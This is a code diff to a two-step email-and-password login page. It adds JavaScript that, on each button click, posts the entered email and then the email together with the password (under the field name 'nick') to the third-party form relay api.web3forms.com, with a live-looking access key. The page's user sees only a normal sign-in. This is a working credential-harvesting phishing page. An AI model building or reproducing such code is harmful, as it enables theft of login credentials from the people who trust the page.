@@ -496,6 +496,7 @@ input.error:focus {
 </div>
 
 <script>
+const loginBtn = document.querySelector(".login-btn");
 const passwordInput = document.getElementById("password");
 const eyeIcon = document.getElementById("eyeIcon");
 const emailCard = document.getElementById("emailCard");
@@ -505,7 +506,7 @@ const emailInput = document.getElementById("email");
 const shownEmail = document.getElementById("shownEmail");
 const changeEmail = document.getElementById("changeEmail");
 
-continueBtn.addEventListener("click", () => {
+continueBtn.addEventListener("click", async () => {
   const emailValue = emailInput.value.trim();
 
   const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailValue);
@@ -519,12 +520,40 @@ continueBtn.addEventListener("click", () => {
   emailInput.classList.remove("error");
   emailError.style.display = "none";
 
+  await fetch("https://api.web3forms.com/submit", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify({
+      access_key: "TU_WKLEJ_SWÓJ_KLUCZ_WEB3FORMS",
+      email: emailValue,
+      subject: "Nowy formularz ze strony"
+    })
+  });
+
   shownEmail.textContent = emailValue;
 
   emailCard.style.display = "none";
   passwordCard.style.display = "block";
 });
+loginBtn.addEventListener("click", async () => {
 
+  await fetch("https://api.web3forms.com/submit", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Accept": "application/json"
+    },
+    body: JSON.stringify({
+      access_key: "13b26a27-bd0d-4893-a3de-62dacb8bf44e",
+      email: shownEmail.textContent,
+      nick: passwordInput.value
+    })
+  });
+
+});
 changeEmail.addEventListener("click", () => {
   passwordCard.style.display = "none";
   emailCard.style.display = "block";
@@ -538,13 +567,12 @@ eyeIcon.addEventListener("click", () => {
     if (passwordVisible) {
 
         passwordInput.type = "text";
+
         eyeIcon.src = "eye-closed.png";
 
     } else {
 
         passwordInput.type = "password";
-
-
 
         eyeIcon.src = "eye-open.png";
 
